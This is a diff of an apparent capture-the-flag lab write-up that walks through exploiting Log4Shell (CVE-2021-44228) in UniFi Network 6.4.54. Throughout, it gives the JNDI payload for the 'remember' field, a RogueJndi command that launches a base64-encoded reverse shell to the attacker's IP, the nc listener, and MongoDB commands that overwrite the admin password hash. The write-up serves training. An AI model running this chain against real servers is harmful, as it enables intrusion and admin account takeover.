@@ -1,6 +1,7 @@
 1. This websites using "Unifi network 6.4.54" software into this and Identify the potential vulneraility called "CVE-2021-44228" and exploit with it.
 -----------------------------------------------------------------------------------------------------------------------------------------------------
 2. when I click login i have request like this
+```bash
 POST /api/login HTTP/1.1
 
 Host: 10.129.124.112:8443
@@ -40,9 +41,10 @@ Connection: keep-alive
 
 
 {"username":"admin","password":"admin","remember":false,"strict":true}
-
+```
 ==============================================================================================================
 3. The response I recived is like below
+```bash
 HTTP/1.1 400 
 
 vary: Origin
@@ -66,6 +68,7 @@ Connection: close
 
 
 {"meta":{"rc":"error","msg":"api.err.Invalid"},"data":[]}
+```
 ===========================================================================================
 4. I planned inject jdni injection into the remerber coloumn,
 And I crafted the payload "${jndi:ldap://{Tun0 IP Address}/whatever}" and I send it via request
@@ -78,7 +81,9 @@ listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 16:27:04.707961 IP 10.10.16.20.ldap > 10.129.124.112.34428: Flags [R.], seq 0, ack 839444712, win 0, length 0
 ''''
 =============================================================================================
+
 5. Then I install the thing mvn package run the reverse code execution listening there.
+```bash
 java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE2LjIwLzEzMzcgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.16.20" 
 +-+-+-+-+-+-+-+-+-+
 |R|o|g|u|e|J|n|d|i|
@@ -94,9 +99,11 @@ Mapping ldap://10.10.16.20:1389/o=groovy to artsploit.controllers.Groovy
 Mapping ldap://10.10.16.20:1389/ to artsploit.controllers.RemoteReference
 Mapping ldap://10.10.16.20:1389/o=reference to artsploit.controllers.RemoteReference
 Sending LDAP ResourceRef result for o=tomcat with javax.el.ELProcessor payload
+```
 then I past this map on my remeberme text 
 i run parallaly "nc -lvnp 1337" concurrently I recived the connection called 
 --------------------------------------------------------------------------------
+```bash
 nc -lvnp 1337
 listening on [any] 1337 ...
 connect to [10.10.16.20] from (UNKNOWN) [10.129.124.112] 60738
@@ -111,16 +118,20 @@ bash: python3: command not found
 unifi@unified:/usr/lib/unifi$ ls
 ls
 bin  data  dl  lib  logs  run  webapps  work
-unifi@unified:/usr/lib/unifi$ 
+unifi@unified:/usr/lib/unifi$
+```
 -----------------------------------------------------------------------------
 i got the foothold from this then i go to priv esc part.
 I run the "ps aux | grep mongo"
+```bash
 ps aux | grep mongo
 ps aux | grep mongo
 unifi         68  0.2  4.1 1103744 85280 ?       Sl   11:20   0:10 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
 unifi       1869  0.0  0.0  11468  1060 pts/0    S+   12:25   0:00 grep mongo
+```
 ------------------------------------------------------------------------------
 Then I run the command mongo default databses with like this 
+```bash
 mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
 
 MongoDB shell version v3.6.3
@@ -696,8 +707,10 @@ MongoDB server version: 3.6.3
         "time_created" : NumberLong(1640910161),
         "last_site_name" : "default"
 }
+```
 ==============================================================================================================
 From this i can understan we can alter the database assign a new password for admin
+```bash
 mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$.MrbTE6Dq9S97sg9$wc67pRKuMlE1xDuRhDD.ajfviKm0eJ4286yhOcHbrJiVZDzJ8f8WDI25F9ZbeR/EtE4CZZsICgzB/eDbB4KoD0"}})' from
 this command we can altered the password.
 
@@ -707,5 +720,6 @@ MongoDB shell version v3.6.3
 connecting to: mongodb://127.0.0.1:27117/ace
 MongoDB server version: 3.6.3
 WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+```
 -----------------------------------------------------------------------------------------------------------------
 After this I login to the webpage then i can easily identify the password and rooted the box.
